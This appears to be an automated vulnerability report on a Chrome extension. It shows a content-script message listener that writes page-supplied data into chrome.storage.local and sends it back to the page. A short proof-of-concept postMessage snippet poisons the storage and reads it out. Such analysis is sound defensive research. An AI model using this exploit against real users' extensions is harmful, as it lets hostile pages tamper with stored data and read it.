# CoCo Analysis: hlfgpniphbabdcolhmimeoohhlpklpjo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlfgpniphbabdcolhmimeoohhlpklpjo/opgen_generated_files/cs_0.js
Line 477	window.addEventListener("message", function(event) {
Line 481	    if (event.data.type && (event.data.type == "SET_OPERATOR_PANEL")) {
Line 482		chrome.storage.local.set({ operatorPanelJSON: event.data.text }, function(res){
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js, Line 477)
window.addEventListener("message", function(event) {
    if (event.source != window)
        return;

    if (event.data.type && (event.data.type == "SET_OPERATOR_PANEL")) {
        chrome.storage.local.set({ operatorPanelJSON: event.data.text }, function(res){ // ← attacker-controlled
            sendOperatorPanelToThePage(); // ← immediately sends data back to page
        });
    }
    else if (event.data.type && (event.data.type == "GET_OPERATOR_PANEL")) {
        sendOperatorPanelToThePage(); // ← attacker can also retrieve directly
    }
});

function sendOperatorPanelToThePage(){
    chrome.storage.local.get(['operatorPanelJSON'], function(result) {
        var event = new CustomEvent("loadOperatorPanelFromExtension", { "detail": result.operatorPanelJSON });
        document.dispatchEvent(event); // ← sends poisoned data back to attacker's page
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage code - Complete storage exploitation chain
// Step 1: Poison the storage and retrieve immediately
window.postMessage({ type: "SET_OPERATOR_PANEL", text: "attacker_payload" }, "*");

// Listen for the data to come back
document.addEventListener("loadOperatorPanelFromExtension", function(event) {
    console.log("Retrieved poisoned data:", event.detail); // Returns "attacker_payload"
});

// Step 2: Or retrieve stored data at any time
window.postMessage({ type: "GET_OPERATOR_PANEL" }, "*");
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.local and immediately retrieve it back via CustomEvent. The extension automatically sends the stored data back to the webpage through document.dispatchEvent, allowing the attacker to verify the poisoning succeeded and exfiltrate any data stored by the extension.
